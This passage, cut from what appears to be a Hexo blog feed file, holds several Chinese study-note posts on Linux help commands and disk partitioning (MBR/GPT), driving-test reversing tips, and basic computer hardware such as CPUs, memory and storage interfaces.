Fri&#x27;</span></span><br><span class="line"></span><br><span class="line">GNU coreutils online <span class="built_in">help</span>: &lt;http://www.gnu.org/software/coreutils/&gt;</span><br><span class="line">请向&lt;http://translationproject.org/team/zh_CN.html&gt; 报告date 的翻译错误</span><br><span class="line">要获取完整文档，请运行：info coreutils <span class="string">&#x27;date invocation&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="man"><a href="#man" class="headerlink" title="man"></a><code>man</code></h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/man.png" alt=""></p><p><code>()</code>里面数字的含义</p><table><thead><tr><th>代号</th><th>代表内容</th></tr></thead><tbody><tr><td>1</td><td><strong>用户在shell环境中可以操作的命令或可执行文件</strong></td></tr><tr><td>2</td><td>系统内核可调用的函数与工具等</td></tr><tr><td>3</td><td>一些常用的函数和函数库</td></tr><tr><td>4</td><td>设备文件说明，通常在/dev下</td></tr><tr><td>5</td><td><strong>配置文件或是某些文件的格式</strong></td></tr><tr><td>6</td><td>游戏</td></tr><tr><td>7</td><td>惯例与协议，网络协议、ASCII代码等</td></tr><tr><td>8</td><td><strong>系统管理员可用的管理命令</strong></td></tr><tr><td>9</td><td>跟内核有关的文件</td></tr></tbody></table><p>man page里面一些常用的操作</p><table><thead><tr><th>按键</th><th>进行工作</th></tr></thead><tbody><tr><td>空格键</td><td>向下翻页</td></tr><tr><td>PU</td><td>向上</td></tr><tr><td>PD</td><td>向下</td></tr><tr><td>Home</td><td>第一页</td></tr><tr><td>End</td><td>最后一页</td></tr><tr><td>/string</td><td>向下寻找string</td></tr><tr><td>?string</td><td>向上寻找string</td></tr><tr><td>n，N</td><td>n寻找下一个，N返向寻找</td></tr><tr><td>q</td><td>退出</td></tr></tbody></table><p>man page的数据一般在/usr/share/man里，可以通过修改/etc/man_db.conf来修改查找路径</p><ul><li>使用<code>man -f man</code>可以查到与man相关所有的相关文件（要完整名称）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ man -f man</span><br><span class="line">man (1)              - 格式化并显示在线帮助手册页</span><br><span class="line">man (7)              - 格式化手册页的宏</span><br><span class="line">man (1p)             - display system documentation</span><br><span class="line">[manu@study ~]$ </span><br></pre></td></tr></table></figure><ul><li>输出结果的左边是命令和数字（<u>代表这个命令的意义</u>），右边是简要说明<ul><li>然后可以使用<code>man 1 man</code>或<code>man 7 man</code>来查看这些说明文档</li><li><code>man man</code>默认是<code>man 1 man</code></li></ul></li><li>使用<code>man -k man</code>会找到有man这个关键字的所有说明文件</li></ul><blockquote><p>在root的Terminal下输入<code>mandb</code>后</p><p><strong>whatis</strong> == man -f</p><p><strong>apropos</strong> == man -k</p></blockquote><h3 id="info"><a href="#info" class="headerlink" title="info"></a><code>info</code></h3><p>info page将文件数据拆拆成一个一个段落，每个段落用自己的页面来编写，各个页面中还有类似超链接的跳转，每个独立的界面叫做节点(<code>node</code>)</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/info.png" alt=""></p><ul><li>File：代表这个info page来自info.info文件</li><li>Node：代表这个页面来自Top节点，Top只是info.info的一个内容节点</li><li>Next：表示下一个节点名，按N跳入</li><li>Up：表示<strong>上一层</strong>节点，按U回退一层</li><li>Prev：表示上一个节点，按P回退一节</li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/node.png" alt="node"></p><table><thead><tr><th>按键</th><th>工作</th></tr></thead><tbody><tr><td><strong>Tab</strong></td><td>在节点之间移动，每个节点前有<code>*</code>提示</td></tr><tr><td><strong>Enter</strong></td><td>进入某节点</td></tr><tr><td><strong>b</strong></td><td>首页</td></tr><tr><td><strong>e</strong></td><td>尾页</td></tr><tr><td>n</td><td>下一节点</td></tr><tr><td>p</td><td>上一节点</td></tr><tr><td>u</td><td>上一层</td></tr><tr><td>s(/)</td><td>搜索</td></tr><tr><td>h/?</td><td>显示帮助选项</td></tr><tr><td>q</td><td>退出</td></tr></tbody></table><h3 id="usr-Unix-System-Resource-share-doc"><a href="#usr-Unix-System-Resource-share-doc" class="headerlink" title="/usr(Unix System Resource)/share/doc/"></a>/usr(Unix System Resource)/share/doc/</h3><p>一些软件说明在里面</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li>忘记命令的选项和参数，使用<code>--help</code></li><li>不知道的命令，使用<code>man</code>或<code>info</code></li><li>利用软件的功能，使用<code>doc</code></li><li>因为对中文支持不完整，还是多学英语吧。我们遇到英语不要怕，而是要勇敢的面对英语，加油^ _ ^奥里给！！</li></ul><h2 id="文本编辑器nano"><a href="#文本编辑器nano" class="headerlink" title="文本编辑器nano"></a>文本编辑器nano</h2><p><code>^</code>代表Ctrl，<code>M</code>代表Alt</p><p>多余的不写了</p><h2 id="正确的关机方法"><a href="#正确的关机方法" class="headerlink" title="正确的关机方法"></a>正确的关机方法</h2><ul><li><strong>sync</strong><ul><li>数据同步写入磁盘，为了效率，一些数据会在内存反复被CPU使用，使用指令后将数据写入硬盘</li></ul></li><li>shutdown<ul><li>可以选择关机模式</li><li>设置关机时间</li><li>可以设置关机信息</li><li>可以设置禁告信息</li></ul></li><li>halt<ul><li>系统停止，可能会保留系统已停止的信息</li></ul></li><li>reboot<ul><li>重启</li></ul></li><li>poweroff<ul><li>系统关机</li></ul></li></ul><p>以上指令都会调用systemctl，这个指令很复杂</p><blockquote><p>参考《鸟哥的Linux私房菜 基础学习篇》</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 热键 </tag>
            
            <tag> nano </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（一）初识Linux</title>
      <link href="/Linux/1.%E5%88%9D%E8%AF%86linux.html"/>
      <url>/Linux/1.%E5%88%9D%E8%AF%86linux.html</url>
      
        <content type="html"><![CDATA[<p>前言：我为什么要学Linux？</p><ol><li>国内墙太厚，打算买vps自己建服务器，想学到更多知识</li><li>想体验不同系统的操作</li><li>为了更深次的理解计算机</li><li>看《30天自制操作系统》感觉自己基础不行，停留在第8天，并且前面的知识也很迷糊（虽然这本书是针对小白的，恕我比小白还白吧:&lt;），想制作一个小系统，也算对大一的自己一个目标吧</li></ol><span id="more"></span><h2 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h2><ul><li>1969年贝尔实验室的Ken Thompson使用汇编写了<code>Unics</code>系统，提出了两个重要概念<ul><li><strong>所有程序或系统设备都是文件</strong></li><li><strong>不管程序本身还是附属文件，所写的程序只有一个目的，且要有效地完成目标</strong></li></ul></li><li>1973年Dennis Ritchie使用<code>C</code>语言将Unics重新编译，并命名为<strong>UNIX</strong>(一开始并没有得到重视，源码可以被拿来做学术研究)</li><li>1977年Bill Joy发布了BSD(Berkeley Software Distribution)，因为使用了UNIK源码，被称为UNIK-like系统</li><li>1979年AT&amp;T想收回了UNIX的版权，在发行第七版时，特别声明“不可向学生提供源码”，因为版权问题造成了许多商业纠纷</li><li>1984年Andrew S.Tanenbaum为了教学生认识UNIX，不参考UNIX源码编写了<code>Minix</code>，能与UNIX兼容</li><li>1984年Richard Stallman提倡<code>GNU</code>计划，倡导自由软件(<code>free software</code>)，强调软件可以自由的取得，复制，修改再发行，并规范GPL授权模式，GPL的软件不可单纯的仅销售其软件，也不可修改软件授权</li><li>1991年芬兰人Linus Torvalds开发出<code>Linux</code>系统，他的成功离不开Minix(UNIX)、GNU、internet、<code>POSIX</code>及虚拟团队的产生</li><li>Linux本身是个普通的操作系统，开发网站是<a href="https://www.kernel.org">https://www.kernel.org</a>，我们称他的底层数据为<strong>内核</strong></li><li>可以查询Linux的内核版本是否长期维护</li><li>Linux的发行版组成：Linux内核+自由软件+文档（工具）+可完全安装的程序</li></ul><h2 id="硬盘分区"><a href="#硬盘分区" class="headerlink" title="硬盘分区"></a>硬盘分区</h2><blockquote><p>在Linux系统中，每个设备都被当成一个文件来对待，比如SATA为<code>/dev/sd[a-d]</code>（按读取顺序命名）</p><p><a href="https://www.kernel.org/doc/html/latest/admin-guide/devices.html">更多设备和文件名</a></p></blockquote><ul><li><p>为什么要分区？</p><ol><li><p>可以保护数据</p><p>比如C盘装系统，D盘装应用</p></li><li><p>高效的性能</p><p>当某一数据来自某一分区时，系统会锁定该分区</p></li></ol></li></ul><h3 id="MBR-MS-DOS-分区表格式与限制"><a href="#MBR-MS-DOS-分区表格式与限制" class="headerlink" title="MBR(MS-DOS)分区表格式与限制"></a>MBR(MS-DOS)分区表格式与限制</h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/MBR.png" alt="MBR"></p><ul><li><p>早期Linux为了兼容Windows磁盘，采用了<strong>MBR</strong>(<code>Master Boot record</code>，主引导记录)来处理引导程序和分区表</p></li><li><p>在旧磁盘第一个扇区的<strong>512</strong>字节里主要含有两个信息：</p><ol><li>MBR：可以安装启动引导程序的地方，有<strong>446</strong>字节</li><li>分区表(<code>partition table</code>)：<strong>64</strong>字节（参考<a href="https://blog.csdn.net/White_Idiot/article/details/80088115">https://blog.csdn.net/White_Idiot/article/details/80088115</a>）</li></ol><p>由于一组记录区有<strong>16</strong>字节，所以只能有<strong>4</strong>组记录表，每组 记录表记录了该区段的起始和结束的柱面号码</p><p>假设上面的设备为<code>/dev/sda/</code>，P1就是<code>/dev/sda1</code></p></li></ul><p>四组分区记录被称为<strong>主要</strong>(<code>Primary</code>)或<strong>扩展</strong>(<code>Extended</code>)分区</p><ul><li>其实分区只是修改那64字节</li><li>最小单位通常叫<strong>柱面</strong>(<code>Cylinder</code>)</li><li>系统写入磁盘时一定要参考分区表</li></ul><p><strong>扩展分区的目的是使用额外的扇区来记录分区信息，扩展分区不能被格式化</strong> <img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/%E9%80%BB%E8%BE%91%E5%88%86%E5%8C%BA.png" alt="逻辑分区"></p><ul><li>由扩展分区切出来的5个分区就是<strong>逻辑分区</strong>(<code>logical partition</code>)，原理有点复杂</li><li>上图的设备文件名如下：<ul><li>P1:/dev/sda1</li><li>P2:/dev/sda2</li><li>L1:/dev/sda5</li><li>L2:/dev/sda6</li><li>L3:/dev/sda7</li><li>L4:/dev/sda8</li><li>L5:/dev/sda9</li></ul></li><li>所以，1-4的文件名是留给主分区的，这是MBR的特性，其他特性<ul><li>P+E的数量只能有4个</li><li>扩展分区只能有1个</li><li>逻辑分区是扩展分区划分出来的</li><li>能被格式化的只有P、L</li><li>逻辑分区的数量要看操作系统，Linux已经突破了63个的限制</li></ul></li></ul><blockquote><p>另外，需要注意的是不同类型的分区不能合并，比如E和L，合并的话分区表被破坏，所有逻辑分区会被删除</p><p>由于第一扇区记录了分区表，若它损坏了，emmm硬盘就废了</p></blockquote><ul><li>由于记录每组分区的只有16字节，所有MBR有很多限制<ul><li>无法使用2.2TB以上的硬盘</li><li>仅有一个区块，损坏后很难修复</li><li>引导区块只有446字节，无法存储较多的程序代码</li></ul></li></ul><h3 id="GPT-GUID-partition-table-磁盘分区表"><a href="#GPT-GUID-partition-table-磁盘分区表" class="headerlink" title="GPT(GUID partition table)磁盘分区表"></a><strong>GPT</strong>(GUID partition table)磁盘分区表</h3><blockquote><p>为了扩大容量，现在每个扇区已经到4K大小，为了兼容所有磁盘，GPT使用了<strong>LBA</strong>(<code>Logical Block Address</code>，逻辑块地址)处理，默认512字节大小，从<strong>LBA0</strong>开始编号</p></blockquote><p>与MBR不同，GPT使用了34个LBA区块记录分区信息，磁盘的最后34个LBA区块也拿来做备份，更加安全</p><ul><li><p><strong>LBA0</strong></p><p>也有两部分，一是和MBR相似的446字节，存储了第一阶段的引导程序；二是64字节放的是特殊标志符，表示这是GPT格式（程序如果不懂就不会处理，更加安全）</p></li><li><p><strong>LBA1(GPT表头记录)</strong></p><p>记录了分区表本身的位置和大小，也记录了备份的位置，放置了分区表校验码(CRC32)，如果有错就去找备份</p></li><li><p><strong>LBA2-33(实际记录分区信息处)</strong></p><p>从2开始，每个LBA都记录了4组分区信息，在默认的模式下，可以有128组分区记录</p><p>因为有512字节，4组记录分区信息，所以用了128字节记录每组信息，此外每组还用了64位来记录记载开始/结束的号码</p><p>于是单元分区最大限制在<strong>2^64 x 512B = 2^30TB</strong>，emm大到爆炸</p></li><li><p>也就是说GPT每组分区都可以单独存在，每组都可以格式化</p></li></ul><h2 id="BIOS和UEFI启动检测程序"><a href="#BIOS和UEFI启动检测程序" class="headerlink" title="BIOS和UEFI启动检测程序"></a>BIOS和UEFI启动检测程序</h2><blockquote><p>并不是所有的操作系统都能读取GPT的格式，也不是所有的“硬件（盘？）”都支持GPT格式，是否能读写又与启动检测程序有关</p></blockquote><h3 id="BIOS搭配MBR-GPT启动流程"><a href="#BIOS搭配MBR-GPT启动流程" class="headerlink" title="BIOS搭配MBR/GPT启动流程"></a>BIOS搭配MBR/GPT启动流程</h3><ol><li>BIOS：启动主动执行的固件，认识第一个可启动的设备</li><li>MBR：第一个启动设备的第一个扇区的主引导记录块，里面有启动引导代码</li><li>启动引导程序(boot loader)：一个可读取内核文件来执行的软件</li><li>内核文件：启动OS</li></ol><p>如果引导程序支持GPT，也会启动GPT里的系统</p><p>另外，BIOS和MBR是硬件本身都会支持的功能，boot loader则是安装在MBR上的一个软件</p><p>boot loader的功能：</p><ol><li>提供选项：可以选择不同的启动选项，这是多重引导的重要功能</li><li>加载内核文件：直接指向可使用的程序区段启动OS</li><li>转交给其他boot loader</li></ol><p><strong>这意味着计算机可以有两个以上的boot loader，启动区除了可以安装在MBR以外，还可以安装在每个分区的启动扇区(boot sector)，代表可以多重引导</strong></p><blockquote><p>为什么安装多重引导要先安装windows再安装Linux?</p><ul><li>Linux安装时，可以手动选择将boot loader安装在MBR还是别的分区的启动扇区，而且Linux的引导程序可以手动选择，所以可以将windows的启动装在Linux的启动引导程序里</li><li>而Windows在安装时，会覆盖安装的分区的MBR或启动扇区，不能选择</li></ul></blockquote><h3 id="UEFI-BIOS搭配GPT启动流程"><a href="#UEFI-BIOS搭配GPT启动流程" class="headerlink" title="UEFI BIOS搭配GPT启动流程"></a>UEFI BIOS搭配GPT启动流程</h3><p>因为BIOS是16位程序，与新系统有点不搭，所以有了UEFI(Unified Extensible Firmware Interface，同一可扩展固件接口)</p><table><thead><tr><th></th><th>传统BIOS</th><th>UEFI</th></tr></thead><tbody><tr><td>程序语言</td><td>汇编</td><td>C</td></tr><tr><td>硬件资源控制</td><td>使用IRQ处理，不可变的内存存取，不可变的输入/输出存取</td><td>使用驱动程序与协议</td></tr><tr><td>处理器运行环境</td><td>16位</td><td>CPU保护模式</td></tr><tr><td>扩充方式</td><td>通过IRQ连接</td><td>直接加载驱动程序</td></tr><tr><td>第三方厂商支持</td><td>较差</td><td>较且可支持多平台</td></tr><tr><td>图形能力</td><td>较差</td><td>较佳</td></tr><tr><td>内置简化操作系统环境</td><td>不支持</td><td>支持</td></tr></tbody></table><h2 id="目录树"><a href="#目录树" class="headerlink" title="目录树"></a>目录树</h2><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/%E6%A0%B9%E7%9B%AE%E5%BD%95.png" alt=""></p><p>文件系统挂载到目录树上</p><p><strong>挂载</strong>就是利用一个目录当成进入点，将磁盘分区的信息放在该目录下，进入这个目录就知道了这个分区的信息</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MBR </tag>
            
            <tag> GPT </tag>
            
            <tag> GNU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>考驾照笔记</title>
      <link href="/Life/car.html"/>
      <url>/Life/car.html</url>
      
        <content type="html"><![CDATA[<p>所处地区：贵州三穗</p><p>学校：铭穗</p><span id="more"></span><h2 id="科一"><a href="#科一" class="headerlink" title="科一"></a>科一</h2><p>没什么好说的, 刷完题就完事.</p><h2 id="科二"><a href="#科二" class="headerlink" title="科二"></a>科二</h2><h3 id="调整座位-后视镜"><a href="#调整座位-后视镜" class="headerlink" title="调整座位, 后视镜"></a>调整座位, 后视镜</h3><ul><li><p>先调整座位再调整后视镜</p></li><li><p>将后视镜划为3等分, 靠里的那个点与后门把手重合即可</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/car02.png" alt=""></p><h3 id="倒库技巧和点位"><a href="#倒库技巧和点位" class="headerlink" title="倒库技巧和点位"></a>倒库技巧和点位</h3><p>评分规则: 不按路线, 没有完全入库, 车身出线, 中途停车, 扣100分</p><p>下面是我自己画的路线图, 仅供参考.</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/daoku.png" alt=""></p><blockquote><p>黄色为控制线, 停车需要将前轮过控制线(与肩膀平齐)</p></blockquote><h4 id="要点一"><a href="#要点一" class="headerlink" title="要点一"></a>要点一</h4><ul><li><p>将车身摆直.</p></li><li><p>车身沿车位线<code>1.5m</code>行驶, 可以参考后视镜下边缘线, 身高不同, 点位也不同, 下图仅供参考.</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/car03.png" alt=""></p><h4 id="要点二-倒车点位"><a href="#要点二-倒车点位" class="headerlink" title="要点二: 倒车点位"></a>要点二: 倒车点位</h4><p><strong>右入库-出库</strong></p><ol><li>看<code>左后视镜底边与控制线距离</code>, 找到自己的点位</li><li>右方向盘打满, <code>看右后视镜</code></li><li>后轮与库边线到30cm时, 回半圈方向盘</li><li><code>看左后视镜</code>, 出现库角, 及时回正方向盘(在车身平行之前)</li><li>看后视镜底边点位停车, <code>挂空档</code>.</li><li><code>挂一档</code>准备出库, 当<code>左后视镜出现库前角</code>时<code>方向盘向左打满</code></li><li>车身平行时回正方向盘, 肩膀与控制线平齐停车, 回空挡挂倒挡.</li></ol><p><strong>左入库</strong></p><ul><li>与右入库差不多, 区别是第二步看左后视镜. 第四步看右后视镜.</li></ul><blockquote><p>小技巧</p><ul><li>当车尾歪时, 想让车尾往哪边走方向盘就往哪边转</li><li>与库边线不平行会影响停车点</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 驾照 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机概论</title>
      <link href="/computer-internal/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A6%82%E8%AE%BA.html"/>
      <url>/computer-internal/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A6%82%E8%AE%BA.html</url>
      
        <content type="html"><![CDATA[<p> 理解一些计算机硬件的基础知识</p><span id="more"></span><h2 id="CPU的架构"><a href="#CPU的架构" class="headerlink" title="CPU的架构"></a>CPU的架构</h2><p> CPU内部有一些微指令，软件都要经过这些指令集来完成</p><p>1.精简指令集（<code>Reduced Instruction Set Computer</code>）</p><p><code>RISC</code>指令较为简单，运行时间短；若要执行复杂的事则需要多条指令</p><p>常见的有<code>ARM</code>,<code>SPAPC</code>等</p><p>2.复杂指令集（<code>Complex Instruction Set Computer</code>）</p><p><code>CISC</code>的每个小指令可以执行一些较为低级的硬件操作，指令复杂，每条指令能做很多事</p><p>比如<code>AMD</code>,<code>Intel</code>的<code>x86</code>架构</p><h2 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h2><blockquote><p>CPU通过主板连接组件，一些集成在主板上的芯片优劣对性能有影响，早期的芯片通过两个网桥连接各组件</p></blockquote><p><strong>北桥：</strong>负责连接速度较快的CPU、内存、与显卡等组件</p><p><strong>南桥：</strong>连接较慢的设备接口，如硬盘、USB设备、网卡等</p><p>目前的架构将北桥整合到了CPU中</p><h2 id="CPU的工作频率"><a href="#CPU的工作频率" class="headerlink" title="CPU的工作频率"></a>CPU的工作频率</h2><p>​        因为早期的CPU架构主要通过北桥来连接CPU、内存、显卡，因此每个设备的工作频率都应该相同。于是出现了前端总线(<code>FSB</code>)，但CPU命令周期很快，为了满足FSB，于是有了<strong>外频</strong>和<strong>倍频</strong></p><ul><li>在早期的设计中，<strong>外频</strong>是指CPU与外部组件传输数据的速度，<strong>倍频</strong>是指CPU内部用来加速的一个<strong>倍数</strong></li></ul><blockquote><p>CPU频率 = 外频 X 倍频</p></blockquote><ul><li>超频：指的是通过主板将CPU的外频和倍频提高成较高频率的方式，但一般倍频被厂家固定，改的是外频</li></ul><blockquote><p>现在CPU会自动帮你超频，自动降频（省电），例如Intel的<code>turbo</code>（睿频）</p></blockquote><h2 id="32位和64位CPU与总线“位宽”"><a href="#32位和64位CPU与总线“位宽”" class="headerlink" title="32位和64位CPU与总线“位宽”"></a>32位和64位CPU与总线“位宽”</h2><blockquote><p>CPU内部有一个内存控制芯片，可以控制内存的频率</p></blockquote><p>前端总线技术(<code>Front Side Bus</code>)：表示了CPU的内存控制芯片与内存间的传输速度</p><blockquote><p>例如我的CPU最大支持的内存频率为<code>2666MHz</code>，每个周期能传输<code>64bit</code>（位宽），则我的内存最大带宽为<code>2666MHz X 64bit = 21.3GB/s</code>，又因为我买了两个组了双通道，总带宽为<code>41.6GB/s</code></p></blockquote><blockquote><p> CPU每次能处理的数据量叫字长<code>word size</code>，比如32位和64位，32位最大只能支持4GB/s的内存</p></blockquote><h2 id="CPU的等级"><a href="#CPU的等级" class="headerlink" title="CPU的等级"></a>CPU的等级</h2><p>​        早期的x86架构有着不同的针脚和设计，目前的64位则称为x86-64，简称x64</p><p>​        很多软件都有针对CPU的一些设计，而新的CPU有着向下兼容的能力，使用软件时应该注意它对CPU的最低标准</p><h2 id="超线程-Hyper-Threading"><a href="#超线程-Hyper-Threading" class="headerlink" title="超线程(Hyper - Threading)"></a>超线程(Hyper - Threading)</h2><p>​        现在的CPU都是多核CPU，而CPU的命令执行周期都很短，很多内核处于闲置状态，现在的操作系统都是多任务的，同时有很多程序让CPU来运行，于是想让CPU同时执行2个程序</p><p>简单实现：将重要寄存器分为两组，让程序分别使用这两组寄存器</p><blockquote><p>使用超线程技术并不一定会提升性能，看情况而定，目前来说利大于弊</p></blockquote><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>​        目前个人电脑的内存主要部件位动态随机存取内存(<code>Dynamic Random Access Mermory</code>)：随机读写内存只有在通电时才记录，断电后数据消失</p><p>​         <code>DRAM</code>又分好几代，有<code>SDRAM</code>和<code>DDR</code>(<code>Double Data Rate</code>) <code>SRAM</code>，DDR是双倍传输速度（类似倍频），他可以在一次时钟周期进行两次数据传输，DDR又分为<code>DDR</code>,<code>DDR2(4倍)</code>,<code>DDR3(8倍)</code>,<code>DDR4</code></p><blockquote><p>需要注意的是，<code>DDR3L</code>指的是降低了内存的工作电压，买主板要注意是否支持，不然会烧毁</p></blockquote><h3 id="多通道设计"><a href="#多通道设计" class="headerlink" title="多通道设计"></a>多通道设计</h3><p>​        因为所有的数据都放在内存，那么内存的位宽越大越好，一般位64bit，组合两根，则是128bit</p><p>​        要启用两个（或四根）内存，那么这两根内存要一模一样最好，因为数据要同步进行读写，才能提高整体带宽</p><blockquote><p>在主板上，内存糟要插相同的颜色，这是专门为了双通道设计的</p></blockquote><h3 id="DRAM-amp-SRAM"><a href="#DRAM-amp-SRAM" class="headerlink" title="DRAM&amp;SRAM"></a>DRAM&amp;SRAM</h3><p>​        对于一些常用的数据如果放在CPU内部的话，就不用重复读取，提高了效率，于是设计了二级缓存</p><p><img src="https://github.com/yangchaohe/yangchaohe.github.io/raw/static/img/article/2019/%E5%86%85%E5%AD%98%E4%B8%8EL2.png" alt=""><br>        要整合到CPU内部，则L2的速度必须跟上CPU，这时候DRAM是无法满足的，需要<code>SRAM(Static Radom Access Memory)</code>，它在设计上使用的晶体管较多，成本很高，但速度快，用到CPU中是个不错的选择</p><h3 id="只读存储器（ROM）"><a href="#只读存储器（ROM）" class="headerlink" title="只读存储器（ROM）"></a>只读存储器（<code>ROM</code>）</h3><p>​        主板上有组件，组件的参数具有可调整性，比如CPU和内存的频率是可以调整的，而网卡、显卡的参数啥的都是记录在主板的<code>CMOS</code>芯片中，CMOS的读写是由主板上的一个存储芯片里的<code>BIOS</code>操作的，这个存储芯片不通电也能存储数据，是只读存储器(<code>Read Only Memory</code>).</p><p>​        ROM是一种非易失性的存储，BIOS 对于PC是很重要的，系统启动都会先去读去这个程序</p><p>​        固件(<code>firmware</code>)也是通过ROM来进行软件的写入，固件像软件一样会被系统执行，但他比硬件内部而言更重要，例如BIOS就是一个固件，控制这硬件的各种参数</p><blockquote><p>​        BIOS对于电脑非常重要，但电脑发展的实在是太迅速了，BIOS也要与时俱进，但ROM是无法改写的，所有现在BIOS通常写入类似<strong>闪存</strong>(<code>flash</code>)或<strong>电可擦除可编程只读存储器</strong><code>EEPROM(Electrically Erasable Programmable Read-Only Memory)</code>存储硬件中</p></blockquote><blockquote><p>固件可以理解为固定在硬件上的控制软件</p></blockquote><h2 id="显卡"><a href="#显卡" class="headerlink" title="显卡"></a>显卡</h2><p>​        也叫<code>VGA</code>(<code>Video Graphics Array</code>)，显示图像的重点在于<strong>分辨率</strong>和<strong>颜色深度</strong>，每个图像显示的颜色会占用内存，所以显卡上也有集成内存<strong>显存</strong></p><p>​        在早期，一些3D图像都是有CPU完成的，但运行程序时CPU已经很忙了，于是在显卡上嵌入了3D加速的芯片，成了现在的GPU</p><p>​        显卡也算高速运算的组件，数据传输自然越快越好，现在用的是<code>PCIe</code>插槽，<code>PCIe</code>用的是类似管道概念来处理</p><table><thead><tr><th align="center">规格</th><th align="center">1x带宽</th><th align="center">16x带宽</th></tr></thead><tbody><tr><td align="center">PCIe 1.0</td><td align="center">250MB/s</td><td align="center">4GB/s</td></tr><tr><td align="center">PCIe 2.0</td><td align="center">500MB/s</td><td align="center">8GB/s</td></tr><tr><td align="center">PCIe 3.0</td><td align="center">1GB/s</td><td align="center">16GB/s</td></tr><tr><td align="center">PCIe 4.0</td><td align="center">2GB/s</td><td align="center">32GB/s</td></tr></tbody></table><blockquote><p>书上一道题：</p><p>假设显示器使用1024X768分辨率，且使用全彩（每个像素占3B（<code>RGB</code>）），需要多少内存？</p><p>答：因为有1024X768 = 786432的像素点，每个占3B，则需要2.25MB的内存</p></blockquote><p>注意PCIe的插槽是与南桥连接还是与CPU直连，阅读主板的逻辑图例</p><h2 id="硬盘和存储设备"><a href="#硬盘和存储设备" class="headerlink" title="硬盘和存储设备"></a>硬盘和存储设备</h2><p>这里只是粗略了解一下机械硬盘，我在《30天自制系统》已经有所了解，不在赘述</p><p>使用机械硬盘要注意通电后别随意移动主机，以防数据损坏，为了让磁头归位，请使用系统关机</p><h3 id="传输接口"><a href="#传输接口" class="headerlink" title="传输接口"></a>传输接口</h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/SATA.jfif" alt="SATA"></p><p>具有一条数据线和电源线，还有一个跳线，只有不兼容才会使用</p><table><thead><tr><th align="center">版本</th><th align="center">带宽Gbit/s</th><th align="center">速度MB/s</th></tr></thead><tbody><tr><td align="center">SATA 1.0</td><td align="center">1.5</td><td align="center">150</td></tr><tr><td align="center">SATA 2.0</td><td align="center">3</td><td align="center">300</td></tr><tr><td align="center">SATA 3.0</td><td align="center">6</td><td align="center">600</td></tr></tbody></table><blockquote><p>传输10位编码时，8位是数据，2位是校验用的，bit转换位B为<code>1:10</code>，虽然理论可达600M/s，但由于物理因素，最快只能达到150M~200M左右</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/SAS.jfif" alt="SAS"></p><blockquote><p>串行SCSI（<code>Serial Attached SCSI</code>），读写稳定速度快，一般用在服务器上，支持热插拔</p></blockquote><table><thead><tr><th align="center">版本</th><th align="center">带宽Gbit/s</th><th align="center">速度MB/s</th></tr></thead><tbody><tr><td align="center">SAS 1.0</td><td align="center">3</td><td align="center">300</td></tr><tr><td align="center">SAS 2.0</td><td align="center">6</td><td align="center">600</td></tr><tr><td align="center">SAS 3.0</td><td align="center">12</td><td align="center">1200</td></tr></tbody></table><h4 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h4><blockquote><p>简介：USB，<code>Universal Serial Bus</code>（通用串行总线）的缩写，USB接口支持设备的即插即用和热插拔功能。</p></blockquote><table><thead><tr><th align="center">版本</th><th align="center"><strong>带宽</strong></th><th align="center">速度</th></tr></thead><tbody><tr><td align="center">USB 1.0</td><td align="center">1.5Mbps</td><td align="center">192KB/s</td></tr><tr><td align="center">USB 1.1</td><td align="center">12Mbps</td><td align="center">1.5MB/s</td></tr><tr><td align="center">USB 2.0</td><td align="center">480Mbps</td><td align="center">60MB/s</td></tr><tr><td align="center">USB 3.0（USB 3.1 Gen 1）</td><td align="center">5Gbps</td><td align="center">500MB/s</td></tr><tr><td align="center">USB 3.1 Gen 2</td><td align="center">10Gbps</td><td align="center">1280MB/s</td></tr></tbody></table><h3 id="固态硬盘"><a href="#固态硬盘" class="headerlink" title="固态硬盘"></a>固态硬盘</h3><blockquote><p>SSD(Solid State Disk)，利用闪存做的存储设备，相对于机械硬盘，没有驱动马达，延迟低，速度快，还省电</p><p>缺点：早期的SSD闪存写入次数有限制，用大概两年就GG，现在的SSD大概用5~6年(不同规格寿命不同)</p></blockquote><h2 id="操作系统"><a href="#操作系统" class="headerlink" 